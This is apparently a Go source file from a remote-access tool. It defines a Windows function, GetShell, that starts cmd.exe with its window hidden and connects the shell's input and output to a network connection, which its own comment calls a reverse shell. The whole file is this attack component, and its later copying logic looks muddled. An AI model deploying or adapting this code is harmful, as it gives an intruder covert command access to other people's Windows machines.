// +build windows !linux !darwin !freebsd

package remoteop

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"log"
	"net"
	"os/exec"
)

// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
func GetShell(conn net.Conn) {
	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Stdout = conn
	exitstatus := cmd.Run()

	copydata := func(r io.Reader, w io.Writer) {
		_, err := io.Copy(w, r)
		if err != nil {
			log.Println(err)
		}
	}

	go copydata(cmd.Stdin, conn)
	go copydata(conn, cmd.Stdout)
	go copydata(conn, cmd.Stderr)

	exitSignal := make(chan int, 1)
	closeCheck := func() {
		if exitstatus == nil {
			fmt.Println("** Process Exited. **\n")
			exitSignal <- 1
		} else {
			fmt.Println("** Process Unexpected Exited. ** \n")
			exitSignal <- 2
		}
	}
	go closeCheck()
	exitData := <-exitSignal
	switch exitData {
	case 1:
		return
	case 2:
		fmt.Println("Function Exit with Error.")
		return
	default:
		return
	}
}
